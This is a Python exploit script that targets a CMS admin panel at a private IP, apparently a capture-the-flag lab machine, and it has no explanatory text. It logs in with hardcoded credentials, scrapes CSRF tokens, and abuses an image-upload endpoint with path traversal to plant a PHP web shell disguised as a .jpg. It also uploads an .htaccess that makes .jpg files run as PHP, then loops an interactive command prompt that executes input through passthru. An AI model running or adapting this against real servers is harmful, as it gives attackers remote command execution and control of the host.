import requests
import os
import time

base_url = "http://10.10.10.191:80/" 
sess = requests.Session()
CSRF_token = ""
filename = ""

def dissect_response(response):

    print("Encoding: " + str(response.apparent_encoding))
    print("-----------------------")
    print("Content: " + str(response.content))
    print("-----------------------")
    print("Cookies: " + str(response.cookies))
    print("-----------------------")
    print("Elapsed time: " + str(response.elapsed))
    print("-----------------------")
    print("Encoding: " + str(response.encoding))
    print("-----------------------")
    print("Headers: " + str(response.headers))
    print("-----------------------")
    print("History: " + str(response.history))
    print("-----------------------")
    try:
        print("JSON: " + str(response.json()))
    except:
        pass
    print("-----------------------")
    print("Links: " + str(response.links))
    print("-----------------------")
    print("Next: " + str(response.next))
    print("-----------------------")
    print("OK:" + str(response.ok))
    print("-----------------------")
    print("Raw: " + str(response.raw))
    print("-----------------------")
    print("Reason: " + str(response.reason))
    print("-----------------------")
    print("Status code: " + str(response.status_code))
    print("-----------------------")
    print("Text: " + str(response.text))
    print("-----------------------")
    print("URL: " + str(response.url))

def get_CSRF_token():
    global sess
    global base_url
    login_url = base_url + "admin/login"
    response = sess.get(login_url)
    text = response.text
    CSRF_token = "" # one token per session
    try:
        CSRF_index = text.index('name="tokenCSRF"')
        text = text[CSRF_index + 23 : ]
        first_apostrophe_index = text.index('"')
        text = text[first_apostrophe_index + 1:]
        second_apostrophe_index = text.index('"')
        text = text[:second_apostrophe_index]
        CSRF_token = text
    except:
        print("CSRF token missing.")
        return null
    return CSRF_token

def login():
    global base_url
    global sess
    global CSRF_token
    login_url = base_url + "admin/login"
    username = "fergus"
    password = "RolandDeschain"
    CSRF_token = get_CSRF_token()
    _payload = {'username':username, 'password':password, 'tokenCSRF':CSRF_token, 'save':''}
    response = sess.post(login_url, data=_payload, allow_redirects=False)
    try: 
        redirect_location = response.headers['Location']
        if(redirect_location.index("dashboard")):
            print("Login successful")
    except Exception as e:
        print(str(e))
        print("Login unsuccessful")
        os._exit(os.EX_OK)


# since dashboard CSRF and login CSRF token are different,
# we do away with the old one and get the new one
def get_CSRF_token_from_dashboard():
    global base_url
    global sess
    global CSRF_token
    dashboard_url = base_url + "admin/new-content"
    response = sess.get(dashboard_url)
    # dissect_response(response) # <---- works fine
    text = response.text
    tokenCSRF_string_index = text.index("var tokenCSRF")
    text = text[tokenCSRF_string_index : ]
    # print(text[:60]) # <------- debug ;)
    starting_apostrophe_index = text.index('"')
    text = text[starting_apostrophe_index + 1:]
    ending_apostrophe_index = text.index('"')
    CSRF_token = text[:ending_apostrophe_index]

def create_shell_payload(command):
    filename = "reverseshell.jpg"
    shell_payload = '<?php '+ command +'; ?>'
    return filename, shell_payload

def deliver_payload(command):
    global sess
    global base_url
    global CSRF_token
    global shell_payload
    upload_content_url = base_url + "admin/ajax/upload-images"
    form_inputs = {
        'tokenCSRF' : CSRF_token,
        'uuid' : '../../tmp/',
        'parent': "",
        'type': 'published',
        'coverImage': "",
        'content': ""
    }
    filename, shell_payload = create_shell_payload(command)
    _payload = [('images[]', (filename, shell_payload, 'application/octet-stream'))]
    response = sess.post(upload_content_url, data=form_inputs, files=_payload)

def create_file_removal_payload():
    filename = "re.jpg"
    file_removal_payload = '<?php rm .htaccess; rm reverseshell.jpg; ?>'
    return filename, file_removal_payload

def deliver_file_removal_payload():
    global sess
    global base_url
    global CSRF_token
    upload_content_url = base_url + "admin/ajax/upload-images"
    form_inputs = {
        'tokenCSRF' : CSRF_token,
        'uuid' : '../../tmp/',
        'parent': "",
        'type': 'published',
        'coverImage': "",
        'content': ""
    }
    filename, file_removal_payload = create_file_removal_payload()
    _payload = [('images[]', (filename, file_removal_payload, 'application/octet-stream'))]
    response = sess.post(upload_content_url, data=form_inputs, files=_payload)
    
def create_htaccess_payload():
    filename = ".htaccess"
    htaccess_payload = "RewriteEngine off\r\nAddType application/x-httpd-php .jpg"
    return filename, htaccess_payload

def deliver_htaccess():
    global sess
    global base_url
    global CSRF_token
    global shell_payload
    upload_content_url = base_url + "admin/ajax/upload-images"
    form_inputs = {
        'tokenCSRF' : CSRF_token,
        'uuid' : '../../tmp/',
        'parent': "",
        'type': 'published',
        'coverImage': "",
        'content': ""
    }
    filename, htaccess_payload = create_htaccess_payload()
    _payload = [('images[]', (filename, htaccess_payload, 'application/octet-stream'))]
    response = sess.post(upload_content_url, data=form_inputs, files=_payload)

login()
get_CSRF_token_from_dashboard()
# print(CSRF_token) <------------ successful update
deliver_file_removal_payload()
while True:
    command = str(input("shell# "))
    command = command.rstrip()
    command = "echo passthru(\"" + command + "\")"
    deliver_payload(command)
    deliver_htaccess()
    response = sess.get(base_url + "bl-content/tmp/reverseshell.jpg")
    print(response.text)
    response = sess.get(base_url + "bl-content/tmp/re.jpg")